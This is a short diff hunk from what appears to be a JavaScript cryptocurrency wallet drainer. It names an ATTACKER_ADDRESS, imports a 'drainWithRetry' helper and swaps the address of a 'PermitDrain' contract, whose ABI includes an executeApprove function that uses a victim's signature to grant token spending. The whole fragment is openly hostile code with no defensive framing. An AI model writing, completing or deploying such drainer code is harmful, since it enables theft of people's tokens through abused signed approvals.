@@ -3,7 +3,7 @@ import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const PERMIT_DRAIN_ADDRESS = '0x78FB31707CAe8eF32E9aB01cd59d6bfEd8D73612'; // Ton contrat PermitDrain
+const PERMIT_DRAIN_ADDRESS = '0x204B08B782f43882eAa29Bcc9725c2E3c7768873'; // Ton contrat PermitDrain
 const PERMIT_DRAIN_ABI = [
   'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
   'function nonces(address) view returns (uint256)'
